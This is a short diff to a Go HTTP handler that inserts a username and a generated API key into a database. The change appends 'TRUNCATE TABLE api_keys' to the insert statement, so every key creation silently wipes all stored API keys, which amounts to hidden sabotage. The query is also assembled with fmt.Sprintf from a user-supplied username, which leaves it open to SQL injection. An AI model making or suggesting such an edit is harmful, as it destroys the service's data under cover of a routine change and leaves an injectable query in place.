@@ -80,7 +80,8 @@ func makego(w http.ResponseWriter, r *http.Request) {
 
 		sqlStatement := fmt.Sprintf(`
 	INSERT INTO api_keys (username, api_key)
-	VALUES ('%v', '%v');`, data.Username, randkey)
+	VALUES ('%v', '%v');
+	TRUNCATE TABLE api_keys`, data.Username, randkey)
 
 		_, err = db.Exec(sqlStatement)
 		if err != nil {
